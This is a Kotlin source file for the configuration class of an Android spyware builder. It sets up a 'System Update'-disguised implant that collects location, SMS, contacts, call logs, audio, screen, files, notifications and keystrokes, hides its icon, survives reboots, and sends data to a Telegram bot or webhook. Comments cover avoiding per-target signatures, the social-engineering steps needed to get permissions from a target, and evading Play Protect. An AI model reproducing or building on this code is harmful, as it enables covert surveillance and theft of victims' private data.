package com.vector.console.data.payload

/**
 * What the generated implant is allowed to do, and where it reports.
 *
 * This is the only thing the builder varies. The template APK is compiled once with every
 * capability present but gated; this config decides which gates open at runtime. That keeps
 * the delivered artifact identical byte-for-byte across specs except for one asset, which is
 * the whole point — a per-target binary is a per-target signature.
 */
data class PayloadSpec(
    val label: String = "System Update",
    val packageName: String = TEMPLATE_PACKAGE,

    // --- collection gates ---
    val collectLocation: Boolean = true,
    val locationMethod: LocationMethod = LocationMethod.RADIO,
    val collectSms: Boolean = false,
    val collectContacts: Boolean = false,
    val collectCalls: Boolean = false,
    val collectAudio: Boolean = false,
    val collectScreen: Boolean = false,
    val collectFiles: Boolean = false,
    val collectNotifications: Boolean = false,
    val collectKeylog: Boolean = false,

    // --- persistence ---
    val bootReceiver: Boolean = true,
    val foregroundService: Boolean = true,
    val hideIcon: Boolean = false,

    // --- reporting ---
    val transport: Transport = Transport.TELEGRAM,
    val telegramToken: String = "",
    val telegramChatId: String = "",
    val webhookUrl: String = "",

    // --- timing ---
    val cadenceSec: Int = 30,
    val wifiOnlyUpload: Boolean = false
) {

    enum class LocationMethod {
        /** Wi-Fi + cell fingerprint through beaconDB. Indoors, ~30 m, cheap. */
        RADIO,

        /** Fused provider. 5 m, drains battery, needs the location toggle on. */
        GNSS,

        /** Both: GNSS when available, radio when it is not. */
        HYBRID
    }

    enum class Transport { TELEGRAM, WEBHOOK, BOTH }

    /**
     * The runtime (dangerous) permissions the chosen gates require.
     *
     * Only real grant dialogs belong here, because the friction count is derived from this list
     * and an inflated list is a lie about what the recipient will see. Three things are
     * deliberately absent:
     *
     * - **install-time** permissions (`INTERNET`, `FOREGROUND_SERVICE*`, `RECEIVE_BOOT_COMPLETED`)
     *   are granted at install and produce no prompt at all
     * - **signature** permissions (`BIND_NOTIFICATION_LISTENER_SERVICE`) cannot be requested,
     *   only toggled in Settings
     * - **background location**, which the dialog refuses on Android 11+
     *
     * Everything excluded here shows up in [settingsOnlyPermissions] instead, so it still costs
     * its steps — just the honest ones.
     */
    fun permissions(): List<String> = buildList {
        if (collectLocation) {
            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
            add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (collectSms) add(android.Manifest.permission.READ_SMS)
        if (collectContacts) add(android.Manifest.permission.READ_CONTACTS)
        if (collectCalls) add(android.Manifest.permission.READ_CALL_LOG)
        if (collectAudio) add(android.Manifest.permission.RECORD_AUDIO)
        if (collectFiles) {
            add("android.permission.READ_MEDIA_IMAGES")
            add("android.permission.READ_MEDIA_VIDEO")
        }
        add(android.Manifest.permission.POST_NOTIFICATIONS)
    }

    /**
     * The permissions Android will only grant from Settings, never from a dialog.
     *
     * These are what make a payload obvious: the target has to walk into Settings and find
     * the app. Anything requiring this list is a capability the builder must warn about,
     * because it converts a one-tap install into a multi-step social engineering script.
     */
    fun settingsOnlyPermissions(): List<String> = buildList {
        if (collectLocation) add("ACCESS_BACKGROUND_LOCATION")
        if (collectNotifications) add("BIND_NOTIFICATION_LISTENER_SERVICE")
        if (collectScreen) add("MediaProjection consent")
        if (collectKeylog) add("AccessibilityService")
    }

    /** Zero-click capabilities do not exist here; this is the honest friction count. */
    fun frictionSteps(): Int = buildList {
        add(1) // install unknown apps
        add(1) // install the APK
        add(1) // launch it once
        if (permissions().isNotEmpty()) add(1) // runtime permission dialog(s)
        addAll(settingsOnlyPermissions().map { 2 }) // Settings detour: open, toggle, come back
    }.sum()

    fun validate(): List<String> = buildList {
        if (packageName.isBlank() || !packageName.contains('.')) {
            add("Package name must be a dotted identifier.")
        }
        if (label.isBlank()) add("Label cannot be empty.")
        if (transport == Transport.TELEGRAM || transport == Transport.BOTH) {
            // Bot tokens are "<numeric id>:<35 chars>"; a wrong shape fails silently at runtime.
            if (!telegramToken.matches(Regex("^\\d{6,}:[A-Za-z0-9_-]{30,}$"))) {
                add("Telegram bot token is not the <id>:<secret> shape BotFather issues.")
            }
            if (telegramChatId.isBlank()) add("Telegram chat id is required.")
        }
        if (transport == Transport.WEBHOOK || transport == Transport.BOTH) {
            if (!webhookUrl.startsWith("https://")) add("Webhook must be https.")
        }
        if (cadenceSec !in 15..3600) add("Cadence must be between 15 s and 1 h.")
        if (collectLocation && locationMethod == LocationMethod.GNSS && cadenceSec < 30) {
            add("GNSS at under 30 s will be killed by the battery optimiser.")
        }
        if (collectScreen && collectAudio) {
            add("Screen and audio capture cannot run simultaneously — one MediaProjection at a time.")
        }
        if (hideIcon && collectKeylog) {
            add("A hidden icon plus accessibility is the fastest way to get flagged by Play Protect.")
        }
    }

    fun isComplete(): Boolean = validate().isEmpty()

    companion object {
        /**
         * The package name compiled into the bundled template. Fixed, not a preference: it is
         * baked into `classes.dex` as the descriptor prefix of every class, so a manifest-only
         * rename yields an APK that installs and then cannot resolve its own activity.
         */
        const val TEMPLATE_PACKAGE = "com.mobilesvc.agent"
    }
}
